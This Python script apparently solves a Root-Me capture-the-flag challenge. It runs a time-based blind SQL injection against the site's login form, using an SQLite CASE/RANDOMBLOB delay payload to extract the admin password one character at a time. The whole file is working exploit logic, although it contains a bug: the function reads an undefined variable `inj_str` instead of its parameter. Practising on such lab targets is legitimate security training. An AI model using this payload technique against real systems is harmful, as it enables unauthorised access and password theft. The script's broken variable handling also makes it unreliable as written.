import requests
import sys
import time
import urllib3


def sqli(inj):
    for j in range(32, 126):
        burp0_url = "http://challenge01.root-me.org:80/web-serveur/ch9/"
        burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://challenge01.root-me.org", "Connection": "close", "Referer": "http://challenge01.root-me.org/web-serveur/ch9/", "Upgrade-Insecure-Requests": "1"}
        payload = inj_str.replace("[CHAR]", chr(j))
        data={}
        data["login"] = "administrator"
        data["password"] = payload
        stime =time.time()
        r = requests.post(burp0_url, headers=burp0_headers, data=data)
        etime = time.time()
        # print etime-stime
        if etime-stime >=3:
            return j
    return None

extracted = ''
for i in range(1,41):
    injection_string = "' OR 1774=(CASE WHEN ((SELECT substr(password,%d,1) FROM users WHERE username='admin') = '[CHAR]') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))) ELSE 1774 END)--" % i
    extracted += chr(sqli(injection_string))
    
print(extracted)
